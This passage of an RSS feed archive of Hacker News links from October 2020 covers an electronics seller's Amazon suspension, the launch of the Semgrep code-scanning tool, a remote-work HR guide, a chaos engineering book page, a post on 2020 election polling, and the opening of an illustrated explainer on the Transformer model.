<p>It was a great plan. The secret operation to overthrow Amazon was underway. The first products, our resistors, were a couple of months away from being available on our website when the empire (Amazon) struck back. In August we received an email from Amazon stating that our Amazon account had been suspended due to us having more than one Amazon seller account. But of course we don‚Äôt. We appealed their decision at least a dozen times but each time they simply state that we need to provide evidence that we don‚Äôt have a second account. They had given us an impossible task to prove that we don‚Äôt have something. We fell victim to the guilty until proven innocent policy of Amazon. There was no way for us to get in touch with a real person at Amazon. So that‚Äôs it. Tens of thousands of orders shipped via Amazon over the years comes to an abrupt end like turning off a light. We were already on our way out the door. Maybe an Amazon AI detected as much and they used an impossible to solve task as an excuse to kick us out.</p>
<p>We were left in an awkward position. The new products weren‚Äôt ready yet. The old products had nowhere to be sold. We ended up selling all of our Amazon inventory at cost to another Amazon seller. We rushed to finish production of the new products. Our core product, resistors, are now in stock with the updated packaging. We will be releasing hundreds of new products under a strict monthly schedule.</p>
<p>The apparent moral of this story is that Amazon is evil. But we already all know that. They gave us a great opportunity in the beginning. We‚Äôve now broken free of their chains completely and we‚Äôre going to build the best darn electronics supply store the world has ever seen. The vision is clear and the route has been mapped out. We will have the lowest price on a per component basis available from any US based online store.</p>
<p>Sometimes it takes a bit of pain to push us to where we need to be. That‚Äôs true in both business and in life.</p>
</div>
</div></div>]]>
            </description>
            <link>https://joeknowselectronics.com/the-end-of-an-amazon-era</link>
            <guid isPermaLink="false">hacker-news-small-sites-24932052</guid>
            <pubDate>Thu, 29 Oct 2020 16:13:31 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Introducing Semgrep and r2c]]>
            </title>
            <description>
<![CDATA[
Score 113 | Comments 21 (<a href="https://news.ycombinator.com/item?id=24931985">thread link</a>) | @pabloest
<br/>
October 29, 2020 | https://r2c.dev/blog/2020/introducing-semgrep-and-r2c/ | <a href="https://web.archive.org/web/*/https://r2c.dev/blog/2020/introducing-semgrep-and-r2c/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section><div><div><div><p>Free, fast, <a href="https://github.com/returntocorp/semgrep" target="_blank" rel="noopener">open-source</a>, offline, customizable. These are not often words that describe code scanning tools, and that's a shame.</p>
<p>We founded r2c to bring world-class security tools to developers based on our conviction that software will run the most exciting parts of the future: everything from medical equipment to robots to autonomous cars. The security process should not be the foe but rather the enabler of rapid software development. If developers lack tooling that is easy to set up and understand‚Äîor if a developer has to convince their manager to spend a few million dollars on advanced security tools each time they change jobs, the future is bleak.</p>
<p>Before founding r2c, we worked on security and developer tools for large companies and governments. It was eye-opening to see that despite massive budgets, their security programs were generally a generation or more behind the tech giants. When it came to security tools for developers, most teams were jaded about scanning code for vulnerabilities; they hated the tools they had to use and usually ignored them beyond doing the minimum necessary to satisfy a compliance checkbox.</p>
<p>What about code scanning at places like Facebook, Apple, Amazon, Netflix, and Google? They don't generally use traditional commercial security tools which ask "how can we find every bug?" Instead, they focus on custom tooling that can build guardrails for developers. This doesn't require million-dollar tools, PhDs in program analysis, or days of compute time. It looks much more like unit tests for security.</p>
<p>We believe there is a gap between traditional compliance tools and simple linters that's ripe for a new approach, and we were fortunate to find partners from Redpoint Ventures and Sequoia Capital who agreed. With them, we raised a $13M Series A round of funding to build a security tool that developers might actually love. We've been working on it quietly for a while now, and we're finally ready to announce it to the world!</p>
<h2>Semgrep</h2>
<p><a href="https://semgrep.dev/" target="_blank" rel="noopener">Semgrep</a>, our open-source product, is specifically designed for eradicating bug classes.
Developers and security engineers can say "this is the safe pattern we always use for (e.g. parsing XML)", write a rule in a few minutes, and enforce that on every editor save, commit, and pull request.</p>
<p>Semgrep is ideal for building security guardrails: start by using frameworks designed with security in mind, then automatically flag code that strays from the <a href="https://semgrep.dev/explore" target="_blank" rel="noopener">secure-by-default path</a>. This is an approach used by <a href="https://landing.google.com/sre/resources/foundationsandprinciples/srs-book/" target="_blank" rel="noopener">Google</a>, <a href="https://about.fb.com/news/2019/01/designing-security-for-billions/" target="_blank" rel="noopener">Facebook</a>, <a href="https://homes.cs.washington.edu/~mernst/pubs/continuous-compliance-ase2020.pdf" target="_blank" rel="noopener">Amazon</a>, Dropbox, Stripe, <a href="https://medium.com/@NetflixTechBlog/scaling-appsec-at-netflix-6a13d7ab6043" target="_blank" rel="noopener">Netflix</a>, and others‚Äîa topic <a href="https://events.bizzabo.com/OWASPGlobalAppSec/agenda/session/315858" target="_blank" rel="noopener">Clint Gibler and I presented on at Global AppSec 2020</a>. This approach increases developer productivity, reduces attack surface, minimizes the areas for human inspection and audit, and allows the security team to scalably protect code written by thousands of developers.</p>
<p>The idea behind Semgrep is simple: it feels like a regular search (grep) but is syntax-aware. You can <a href="https://semgrep.dev/learn" target="_blank" rel="noopener">learn Semgrep</a> in a few minutes! And Semgrep can be used for <a href="https://semgrep.dev/explore" target="_blank" rel="noopener">more than just security</a> issues: performance, internationalization, or just annoyances <a href="https://r2c.dev/blog/2020/fixing-leaky-logs-how-to-find-a-bug-and-ensure-it-never-returns" target="_blank" rel="noopener">committed by accident</a>.</p>
<p><span>
      <a href="https://r2c.dev/static/730ca8541e43ed871d2edb7c02226b0c/bde6a/semgrep-foo-small.png" target="_blank" rel="noopener">
    <span></span>
  <img alt="Semgrep pattern example" title="Semgrep pattern example" src="https://r2c.dev/static/730ca8541e43ed871d2edb7c02226b0c/bde6a/semgrep-foo-small.png" srcset="https://r2c.dev/static/730ca8541e43ed871d2edb7c02226b0c/bde6a/semgrep-foo-small.png 283w" sizes="(max-width: 283px) 100vw, 283px" loading="lazy">
  </a>
    </span></p>
<p><code>$ semgrep -e foo(1)</code> matches all equivalent variations. <a href="https://semgrep.dev/s/ievans:python-exec" target="_blank" rel="noopener">See a live example of matching <em>exec</em> calls</a></p>
<h2>What's Next?</h2>
<p>Semgrep started as an open-source project at Facebook and we're lucky to have its original author, Yoann Padioleau, on our team at r2c. Since we released the first post-Facebook version (0.4) earlier this year, we've released 25 new versions, added support for 8 new languages, reworked the parsers so we could collaborate with Github on <a href="https://tree-sitter.github.io/" target="_blank" rel="noopener">tree-sitter</a>, been joined by thousands of enthusiastic GitHub followers, and seen over 100K pulls of the Semgrep Docker image.</p>
<p>Our roadmap contains more program analysis features to support the sorts of secure-by-default enforcement that large technology companies are already leveraging so heavily (constant propagation, taint tracking, and more), as well as support for many more languages.</p>
<h2>Batteries Included</h2>
<p>Along with this release of Semgrep, we're announcing the availability of <a href="https://semgrep.dev/" target="_blank" rel="noopener">Semgrep Community</a>, a free, hosted service for managing Semgrep CI as well as Semgrep Teams, a paid service which adds additional features for managing Semgrep that are useful for enterprises. Both these offerrings provide SaaS infrastructure for operating a modern AppSec program. They enable central definition of code standards for your projects and show results where you already work: GitHub, GitLab, Slack, Jira, VS Code, and more.</p>
<p>We're also excited that <a href="https://semgrep.dev/explore" target="_blank" rel="noopener">Semgrep Registry</a> already has 900+ rules written by r2c and the community‚Äîyou can start running on your project right now! Or if you like to DIY, <a href="https://semgrep.dev/editor" target="_blank" rel="noopener">try writing your own</a>.</p></div></div></div></section></div>]]>
            </description>
            <link>https://r2c.dev/blog/2020/introducing-semgrep-and-r2c/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24931985</guid>
            <pubDate>Thu, 29 Oct 2020 16:07:32 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Don't ruin your company when going remote with bad HR processes]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24931904">thread link</a>) | @designerdusko
<br/>
October 29, 2020 | https://www.ahoyteam.com/from-office-to-remote | <a href="https://web.archive.org/web/*/https://www.ahoyteam.com/from-office-to-remote">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="readonline"><p><h3>Read full guide online</h3><h3>Transitioning to a fully remote company in times of change</h3></p><div><h3>Introduction</h3><p>As the world changes in times of the COVID-19 pandemic, businesses are having to quickly adapt, not only for their consumers, but also to protect their employees. Many companies are needing to implement full work-from-home policies, and support their staff during this change. At Ahoy Team, we‚Äôve built our company on helping companies transition to remote work, while upholding great company culture and accountability for asynchronous, and distributed teams. <br>During this time, we wanted to help by sharing some of our top tips for transitioning to a fully remote company. As we adjust to our new normal, some of these tips might outlast the lockdown as we begin to interact as teams again. <br></p><ol role="list"><li><a href="#section1"><strong>First steps as you go remote</strong></a></li><li><a href="#section2"><strong>Help employees set up work environment at home </strong></a></li><li><a href="#section3"><strong>Help teams run effective meetings</strong></a></li><li><a href="#section4"><strong>Keep employees informed</strong></a></li><li><a href="#section5"><strong>How to maintain company culture</strong></a></li><li><a href="#section6"><strong>When it returns to normal</strong></a></li></ol><p><em>Each chapter will include examples of workflows that could be implemented through AhoyTeam platform.</em><br></p></div><div id="section1"><p><strong>SECTION 1.</strong></p><h3><strong>First steps as you go remote</strong></h3><p>So, chances are as you‚Äôre reading this your company has already been forced to work from home. You likely emailed employees informing them that your office location was closing, and sent them well wishes. This is an unprecedented time for all of us, so it‚Äôs important to play catch up now with the things that help with remote culture. <br></p><ol role="list"><li>Start now by emailing your leadership team. Empower them to answer frequently asked questions, host virtual town hall meetings, and offer virtual ‚Äòoffice hours‚Äô. During times of crisis, employees often need more reassurance and are likely to ask questions repeatedly- stress makes it difficult for information to stick for all of us, and the answers are likely changing rapidly. If you missed anything in your original ‚Äòeverybody go home‚Äô email, don‚Äôt hesitate to share another one. Strong leadership and regular communication helps to maintain morale and support during this time. </li><li>Update documentation, or create a hub page on your employee portal or intranet to help employees find things. Nobody wants to be sifting through lots of information trying to find what they need- surface relevant information to them. Outline any policies, such as insurance benefits, sick leave and absence policies, and contact information they might need. </li><li><strong>Remote meetings: </strong>As you switch your meetings to remote, be mindful of the additional pressure employees may be under and lead with compassion. Remind your employees during each meeting that their mental health is the priority, that it is ok to have interruptions as people try to navigate family life and childcare, and ask yourself if meetings are really necessary. Different employee personalities may find virtual meetings stressful, so don‚Äôt default to a meeting when an email could work just as well. </li><li>Research other tools that could help and ensure everyone has access to them. While now isn‚Äôt the time for huge changes and big roll outs, tools such as Slack can be a quick, easy to implement way to keep people connected. Look for small changes that can relieve pressure and increase collaboration.</li><li>Create a Slack or communication channel. How does Slack fit into all of this? Well, in place of team members seeing each other every day and spending time together in meetings or over lunch hours, companies can create bonds by utilising technology to allow employees to spend time with each other. Create a dedicated channel for COVID-19 updates, and allow space for fun and distraction. </li></ol><div><div><div><p><img src="https://uploads-ssl.webflow.com/5d31a928f970eef3b21792ac/5f5b40121273b19baecc579e_ahoyslack.svg" loading="lazy" height="50" alt=""></p><h4><strong>Boost social interactions in remote setup</strong><br></h4></div></div></div><div><div><div><p><img src="https://uploads-ssl.webflow.com/5d31a928f970eef3b21792ac/5f5b40121273b19baecc579e_ahoyslack.svg" loading="lazy" height="50" alt=""></p><h4><strong>Slack culture 101 onboarding for each employee</strong><br></h4></div></div></div></div><div id="section2"><p><strong>SECTION 2.</strong></p><h3>Help employees set up work environment at home</h3><p>Not everyone has worked from home before, and may find it a challenge. As a leader, you can help by ensuring that people have things that they need.<br></p><p>Physical tips:</p><ol role="list"><li><strong>Make sure they have the devices they need:<br></strong>- Bluetooth headsets for remote calls<br>- Seperate keyboards and mice for reducing wrist strain<br>- Ergonomic chairs, or the means to reimburse chairs<br>- Additional monitors, if your employees normally use them i.e programmers or finance</li><li><strong>Make sure employees have access to the software they need:<br></strong>- Ensure they can download Zoom, Google Hangouts, or similar video conferencing software<br>- Update your safety and security policies to reduce additional concerns. Ensure VPN can handle the additional traffic.</li><li><strong>Share physical health tips, such as videos on stretching and how to adjust your chair properly </strong>- without being in an office your employees are not getting their usual assessments. </li><li><strong>Make a quick and easy process for employees to report cases and symptoms. </strong>Make it easy for them to get support from their manager, HR, health care provider, and do not make them jump through any additional administrative hoops to do so.</li><li><strong>Provide health and safety information to help employees navigate the noise</strong>, such as cleaning information, and the latest confirmed government advice. For some people, they are struggling to navigate through less-than-ideal spaces, so communication and mental health is important.</li></ol><div><div><div><p><img src="https://uploads-ssl.webflow.com/5d31a928f970eef3b21792ac/5f5b40121273b19baecc579e_ahoyslack.svg" loading="lazy" height="50" alt=""></p><h4><strong>Simple weekly employee health check (COVID-19 version)</strong><br></h4></div></div></div><p>Mental tips:</p><ol role="list"><li><strong>Remind your employees that it is ok to be working surrounded by laundry, or with a child on their lap, during this time. </strong>Share anecdotes and funny pictures of your workspace to remind employees we‚Äôre all in this together.</li><li><strong>Make sure that your employees know who their main POC is in case they need help navigating working from home. </strong>If you already have remote workers, consider making them remote work ‚Äòchampions‚Äô, who can share their tips. </li><li><strong>Remind employees to separate their work and home environments wherever possible, </strong>by closing a door on their office, packing away their laptop, or changing their clothes to mark a difference between ‚Äòwork‚Äô and ‚Äòhome‚Äô time. </li><li><strong>You can also generate positivity by creating community activities </strong>like virtual workouts, virtual volunteering, or lunch hours to maintain positive relationships. <strong><br></strong></li><li><strong>Make sure to share your expectations and make sure they are manageable for people. </strong>Some members of staff may find it exceptionally helpful to understand that the 9am stand up meeting is critical, but that they can alternate with a colleague on another one to reduce the pressure. Make sure to communicate your expectations around working hours, and consider if you can make this more flexible for both your employees and your customers. </li><li><strong>Link to resources for people, such as mental health resources, and make it easily available on employee intranet. </strong>Create community activity like content by wellness specialists, watch parties or book clubs. Enable a forum for your employees to share content with each other, such as Mindfulness meditation videos, podcasts, tips and ideas of what‚Äôs working for them. </li></ol></div><div id="section3"><p><strong>SECTION 3.</strong></p><h3><strong>Help teams run effective meetings</strong></h3><p>As all meetings switch to virtual, help your teams make effective use of their time and maximise meeting effectiveness. This is not just for your company- it also helps employees get more time back and remain focused, which is going to help with mental health.<br></p><p>Set up a good meeting rhythm to help stay connected, such as weekly 1-2-1s with managers, team calls and a company all hands. Share basic meeting tips for remote communication, which can help remind employees how to streamline their daily tasks and spend more time with family or community. <br></p><ul role="list"><li><strong>Always have an agenda for a meeting. </strong>If there isn‚Äôt an agenda, empower employees to ask, or switch it to an email</li><li><strong>Keep minutes from meetings, </strong>or record calls, to help absent, time-zone separated or employees with childcare problems to catch up</li><li><strong>Start and end meetings on time. </strong>For some employees, the fact they are working from home and enjoying the conversation means meetings can drag on. Being on time helps reduce stress for busy parents, and manages expectations across teams. </li><li><strong>Be flexible. </strong>Meetings should be at a time that causes minimal disruption for all members</li><li><strong>Have a facilitator. </strong>People are coping with the pandemic differently, and having a facilitator means that person can support the rest of the team keeping the meeting productive.</li><li><strong>Start the meeting with wins. </strong>Thank your team for their hard work, focus on the positives, and then move on to alignment and troubleshooting. </li></ul><div><div><div><p><img src="https://uploads-ssl.webflow.com/5d31a928f970eef3b21792ac/5f5b40121273b19baecc579e_ahoyslack.svg" loading="lazy" height="50" alt=""></p><h4><strong>Written Daily Standup</strong><br></h4></div></div></div><div><div><div><p><img src="https://uploads-ssl.webflow.com/5d31a928f970eef3b21792ac/5f5b40121273b19baecc579e_ahoyslack.svg" loading="lazy" height="50" alt=""></p><h4><strong>Schedule weekly Zoom calls with actionable task before and after the call</strong><br></h4></div></div></div></div><div id="section4"><p><strong>SECTION 4.</strong></p><h3><strong>Keep employees informed</strong></h3><p>The more transparent you can be with your team and employees, the more they will be able to minimise stress and predict any difficult decisions you may need to make down the road. There‚Äôs no silver bullet and single answer to this, but you can help keep employees safe and engaged by improving how you communicate with them.<br></p><ul role="list"><li><strong>Create open, transparent communication channels such as Slack, to share news and information. </strong>In times of uncertainty, it‚Äôs even more important to have a single hub where people can ask questions and share updates. </li><li><strong> Be upfront and honest on team calls about company finances. </strong>It‚Äôs not easy, but people are concerned about their income, and the more you can share, along with any safeguards you‚Äôre putting in place to help reduce layoffs (such as government or tax claims), the better. People will speculate anyway, so it‚Äôs important to give them clarity, even if it‚Äôs bad news. </li><li><strong>Enable collaboration.</strong> Working remotely can make communication difficult- we tend to forget all those natural conversations that happen by virtue of proximity. Slack lets you work collaboratively by bringing tagging and chat into documents. Be available, and be mindful of any miscommunication that can happen more readily without non-verbal cues. </li><li><strong>Make it easy to find information. </strong>Surface Slack channels where key information is brought to the forefront- people will have a lot of questions for IT, HR and facilities teams in particular. </li></ul></div><div id="section5"><p><strong>SECTION 5.</strong></p><h3><strong>How to maintain company culture</strong></h3><p>For a remote team, company culture is critical. A common misconception (that I‚Äôm here to ‚Ä¶</p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.ahoyteam.com/from-office-to-remote">https://www.ahoyteam.com/from-office-to-remote</a></em></p>]]>
            </description>
            <link>https://www.ahoyteam.com/from-office-to-remote</link>
            <guid isPermaLink="false">hacker-news-small-sites-24931904</guid>
            <pubDate>Thu, 29 Oct 2020 15:59:51 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Chaos Engineering: System Resiliency in Practice (Free eBook)]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24931833">thread link</a>) | @pavanyara
<br/>
October 29, 2020 | https://www.verica.io/book/ | <a href="https://web.archive.org/web/*/https://www.verica.io/book/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="block-block_5f75bae1cc92f">
  <div>
  	
  	<div>
  					<div>
				<p>Complex systems become fragile in unexpected and unpredictable ways. The authors of this book go deep explaining the core practices and providing real-world stories and practical advice on how teams are using the ideas around Chaos Engineering to make their systems more resilient.</p>
				<p><img src="https://3a5tqh34z6ey1ph7ny27auog-wpengine.netdna-ssl.com/wp-content/uploads/Bitmap-1.png">
				</p>
				<div>
					<p><strong>Michael Loop</strong>
					</p>
					<p>
					Former VP of Engineering at Slack   				</p>
			</div>
		</div>
								<div>
				<p>I found this book as a great resource in understanding and leveraging Chaos principles in my profession as a leader of a team of engineers, responsible for mitigating the risks and ensuring the ‚Äúhigh availability‚Äù of multiple products. I highly recommend it to those in software design/development/quality engineering. who want to learn more about how Chaos engineering can help you to proactively extract the possible risks by leveraging well explained methodologies.</p>
				<p><img src="">
				</p>
				
		</div>
								<div>
				<p>An excellent guide to the state of the art in Chaos Engineering.</p>
				<p><img src="https://3a5tqh34z6ey1ph7ny27auog-wpengine.netdna-ssl.com/wp-content/uploads/cockcroft.png">
				</p>
				
		</div>
				
  </div>
  	
  </div>
</div></div>]]>
            </description>
            <link>https://www.verica.io/book/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24931833</guid>
            <pubDate>Thu, 29 Oct 2020 15:54:23 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Forget It and Set It]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24931780">thread link</a>) | @abyx
<br/>
October 29, 2020 | https://avivbenyosef.com/forget-it-and-set-it/ | <a href="https://web.archive.org/web/*/https://avivbenyosef.com/forget-it-and-set-it/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to retrieve article]]>
            </description>
            <link>https://avivbenyosef.com/forget-it-and-set-it/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24931780</guid>
            <pubDate>Thu, 29 Oct 2020 15:49:56 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[What could the polls be missing this Presidential election?]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24931725">thread link</a>) | @dsaavy
<br/>
October 29, 2020 | https://www.melovedata.com/what-could-the-polls-be-missing-in-this-presidential-election/ | <a href="https://web.archive.org/web/*/https://www.melovedata.com/what-could-the-polls-be-missing-in-this-presidential-election/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

		<div>

			
<div>
<div>
<p>Recently I wrote an article on the <a href="https://www.melovedata.com/twitter-still-hasnt-unlocked-the-new-york-posts-account/" target="_blank" rel="noreferrer noopener">New York Post‚Äôs Twitter account still being locked</a>. This is still the case,  and it made me brainstorm many other topics associated with elections . This thinking session brought up the topic of polls and predictions. How accurate are they? Why were many polls so far off in 2016? Why do polls seem to tighten the closer to election day? [<a href="https://slate.com/news-and-politics/2008/10/why-do-polls-always-tighten-right-before-an-election.html" target="_blank" rel="noreferrer noopener">1</a>][<a href="https://www.politifact.com/factchecks/2008/dec/01/barack-obama/elections-tighten-almost-every-time/" target="_blank" rel="noreferrer noopener">2</a>]</p>



<p>Many polls are predicting Biden to <a href="https://projects.fivethirtyeight.com/2020-election-forecast/" target="_blank" rel="noreferrer noopener">win by a large margin</a>, and many of the points I make below indicate factors that could make the margin much smaller. The one factor that could cause a greater margin than predicted would be an increase in Black and Hispanic voter participation. This is due to the fact that Biden still holds majority over those demographics so an increase in the total number of voters would benefit him the greatest.</p>



<h3>Here‚Äôs what I think the polls could be missing</h3>



<h5>Narrowing party registration gaps, especially in swing states.</h5>



<p>There are indications that <a href="https://www.cbsnews.com/news/voter-registration-republicans-swing-states-narrow-gap/" target="_blank" rel="noreferrer noopener">Republicans have significantly closed the registered voter gap</a>, especially in swing states. Trump narrowly won the 2016 election in many of these states, so a lesser difference between registered Democrats and registered Republicans could indicate Trump holding his lead in swing states. Of course, non-affiliated voters still hold a large chunk (often 20%+) in swing states, so nothing is set in stone.</p>



<h5>Unwillingness for people to truthfully poll, especially for a candidate like Donald Trump. </h5>



<p>Some studies have shown that people are <a href="https://www.cloudresearch.com/resources/blog/election-2020-poll-respondent-honesty/" target="_blank" rel="noreferrer noopener">unwilling to share their vote choice with polls</a>. The study linked states that around 11.7% of Republicans don‚Äôt share their truthful choice with polls, 10.5% of non-afiiliated, and 5.4% of Democrats. That‚Äôs certainly not insignificant.</p>



<h5>Shifting demographics in the Black and Hispanic vote. </h5>



<p>If the Black and Hispanic vote turnout is the same or less than 2016, this will be a net negative impact for the Democratic party. <a href="https://fivethirtyeight.com/features/trump-is-losing-ground-with-white-voters-but-gaining-among-black-and-hispanic-americans/" target="_blank" rel="noreferrer noopener">Trump closed the polling gap from 2016 between both these demographics</a> (although still doesn‚Äôt poll above 50% for either demographic). So if the total pie of votes for Black and Hispanic voters doesn‚Äôt increase, Trump takes a bigger portion of a pie the same size as 2016.</p>



<h5>Increasing distrust of media and technology amongst conservatives.</h5>



<p>If a person doesn‚Äôt trust the news, believes they‚Äôre being censored, or is generally less trusting in institutions, why would they answer truthfully to polls? Why would they participate in the polls in the first place?  Are polls even further off than the ‚Äúshy‚Äù voters study linked in the truthful poll section above?</p>



<h5>Unknown voter turnout for the Black and Hispanic vote.</h5>



<p>2016 saw a decrease in participation with these two demographics. If participation is higher than anticipated, it will significantly benefit Biden and result in a landslide win.</p>



<h3>Wrapping it up</h3>



<p>While many polls try to adjust for factors like these, it‚Äôs impossible to accurately measure all the variables associated with elections. For example, every time that Florida has seen under a 4% party registration spread, Republicans have won the state, anything above 4%, the Democrats have won. Right now the spread is under 2%. But mail-in voting will be at an all time high, so will overall participation increase or are only active voters shifting their voting method? </p>



<p>Many polls will correctly predict the election within their margin of error. The only issue is that it‚Äôs not useful in states consistently decided by less than the typical margin of error (like <a href="https://en.wikipedia.org/wiki/2016_United_States_presidential_election_in_Pennsylvania" target="_blank" rel="noreferrer noopener">Pennsylvania </a>and <a href="https://en.wikipedia.org/wiki/2016_United_States_presidential_election_in_Florida" target="_blank" rel="noreferrer noopener">Florida</a>).</p>
</div>




</div>



<hr>



<p>Enjoy the content? Subscribe below to get notifications of new posts and access to subscriber giveaways.</p>



	<div data-blog-id="177716820">
		<div>
			
			
				<p>
					Processing‚Ä¶				</p>
				<p>
					Success! You're on the list.				</p>
				<p>
					Whoops! There was an error and we couldn't process your subscription. Please reload the page and try again.				</p>

					</div>
	</div>
	

		</div><!-- .entry-content -->

	</div></div>]]>
            </description>
            <link>https://www.melovedata.com/what-could-the-polls-be-missing-in-this-presidential-election/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24931725</guid>
            <pubDate>Thu, 29 Oct 2020 15:45:19 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Illustrated Transformer Visualizing machine learning one concept at a time]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24931724">thread link</a>) | @mrfusion
<br/>
October 29, 2020 | https://jalammar.github.io/illustrated-transformer/ | <a href="https://web.archive.org/web/*/https://jalammar.github.io/illustrated-transformer/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <p><span>Discussions:
<a href="https://news.ycombinator.com/item?id=18351674">Hacker News (65 points, 4 comments)</a>, <a href="https://www.reddit.com/r/MachineLearning/comments/8uh2yz/p_the_illustrated_transformer_a_visual_look_at/">Reddit r/MachineLearning (29 points, 3 comments)</a>
</span>
<br>
<span>Translations: <a href="https://blog.csdn.net/yujianmin1990/article/details/85221271">Chinese (Simplified)</a>, <a href="https://tips-memo.com/translation-jayalmmar-transformer">Japanese</a>, <a href="https://nlpinkorean.github.io/illustrated-transformer/">Korean</a>, <a href="https://habr.com/ru/post/486358/">Russian</a>, <a href="https://hackernoon.com/el-transformador-ilustrado-una-traduccion-al-espanol-0y73wwp">Spanish</a></span>
<br>
<span>Watch: MIT‚Äôs <a href="https://youtu.be/53YvP6gdD7U?t=432">Deep Learning State of the Art</a> lecture referencing this post</span></p>

<p>In the <a href="https://jalammar.github.io/visualizing-neural-machine-translation-mechanics-of-seq2seq-models-with-attention/">previous post, we looked at Attention</a> ‚Äì a ubiquitous method in modern deep learning models. Attention is a concept that helped improve the performance of neural machine translation applications. In this post, we will look at <strong>The Transformer</strong> ‚Äì a model that uses attention to boost the speed with which these models can be trained. The Transformers outperforms the Google Neural Machine Translation model in specific tasks. The biggest benefit, however, comes from how The Transformer lends itself to parallelization. It is in fact Google Cloud‚Äôs recommendation to use The Transformer as a reference model to use their <a href="https://cloud.google.com/tpu/">Cloud TPU</a> offering. So let‚Äôs try to break the model apart and look at how it functions.</p>

<p>The Transformer was proposed in the paper <a href="https://arxiv.org/abs/1706.03762">Attention is All You Need</a>. A TensorFlow implementation of it is available as a part of the <a href="https://github.com/tensorflow/tensor2tensor">Tensor2Tensor</a> package. Harvard‚Äôs NLP group created a <a href="http://nlp.seas.harvard.edu/2018/04/03/attention.html">guide annotating the paper with PyTorch implementation</a>. In this post, we will attempt to oversimplify things a bit and introduce the concepts one by one to hopefully make it easier to understand to people without in-depth knowledge of the subject matter.</p>

<h2 id="a-high-level-look">A High-Level Look</h2>
<p>Let‚Äôs begin by looking at the model as a single black box. In a machine translation application, it would take a sentence in one language, and output its translation in another.</p>

<p><img src="https://jalammar.github.io/images/t/the_transformer_3.png">
</p>

<!--more-->

<p>Popping open that Optimus Prime goodness, we see an encoding component, a decoding component, and connections between them.</p>

<p><img src="https://jalammar.github.io/images/t/The_transformer_encoders_decoders.png">
</p>

<p>The encoding component is a stack of encoders (the paper stacks six of them on top of each other ‚Äì there‚Äôs nothing magical about the number six, one can definitely experiment with other arrangements). The decoding component is a stack of decoders of the same number.</p>

<p><img src="https://jalammar.github.io/images/t/The_transformer_encoder_decoder_stack.png">
</p>

<p>The encoders are all identical in structure (yet they do not share weights). Each one is broken down into two sub-layers:</p>

<p><img src="https://jalammar.github.io/images/t/Transformer_encoder.png">
</p>

<p>The encoder‚Äôs inputs first flow through a self-attention layer ‚Äì a layer that helps the encoder look at other words in the input sentence as it encodes a specific word. We‚Äôll look closer at self-attention later in the post.</p>

<p>The outputs of the self-attention layer are fed to a feed-forward neural network. The exact same feed-forward network is independently applied to each position.</p>

<p>The decoder has both those layers, but between them is an attention layer that helps the decoder focus on relevant parts of the input sentence (similar what attention does in <a href="https://jalammar.github.io/visualizing-neural-machine-translation-mechanics-of-seq2seq-models-with-attention/">seq2seq models</a>).</p>

<p><img src="https://jalammar.github.io/images/t/Transformer_decoder.png">
</p>

<h2 id="bringing-the-tensors-into-the-picture">Bringing The Tensors Into The Picture</h2>

<p>Now that we‚Äôve seen the major components of the model, let‚Äôs start to look at the various vectors/tensors and how they flow between these components to turn the input of a trained model into an output.</p>

<p>As is the case in NLP applications in general, we begin by turning each input word into a vector using an <a href="https://medium.com/deeper-learning/glossary-of-deep-learning-word-embedding-f90c3cec34ca">embedding algorithm</a>.</p>



<p><img src="https://jalammar.github.io/images/t/embeddings.png">
  <br>
  Each word is embedded into a vector of size 512. We'll represent those vectors with these simple boxes.
</p>

<p>The embedding only happens in the bottom-most encoder. The abstraction that is common to all the encoders is that they receive a list of vectors each of the size 512 ‚Äì In the bottom encoder that would be the word embeddings, but in other encoders, it would be the output of the encoder that‚Äôs directly below. The size of this list is hyperparameter we can set ‚Äì basically it would be the length of the longest sentence in our training dataset.</p>

<p>After embedding the words in our input sequence, each of them flows through each of the two layers of the encoder.</p>

<p><img src="https://jalammar.github.io/images/t/encoder_with_tensors.png">
  <br>

</p>

<p>Here we begin to see one key property of the Transformer, which is that the word in each position flows through its own path in the encoder. There are dependencies between these paths in the self-attention layer. The feed-forward layer does not have those dependencies, however, and thus the various paths can be executed in parallel while flowing through the feed-forward layer.</p>

<p>Next, we‚Äôll switch up the example to a shorter sentence and we‚Äôll look at what happens in each sub-layer of the encoder.</p>

<h2 id="now-were-encoding">Now We‚Äôre Encoding!</h2>

<p>As we‚Äôve mentioned already, an encoder receives a list of vectors as input. It processes this list by passing these vectors into a ‚Äòself-attention‚Äô layer, then into a feed-forward neural network, then sends out the output upwards to the next encoder.</p>

<p><img src="https://jalammar.github.io/images/t/encoder_with_tensors_2.png">
  <br>
  The word at each position passes through a self-attention process. Then, they each pass through a feed-forward neural network -- the exact same network with each vector flowing through it separately.
</p>

<h2 id="self-attention-at-a-high-level">Self-Attention at a High Level</h2>
<p>Don‚Äôt be fooled by me throwing around the word ‚Äúself-attention‚Äù like it‚Äôs a concept everyone should be familiar with. I had personally never came across the concept until reading the Attention is All You Need paper. Let us distill how it works.</p>

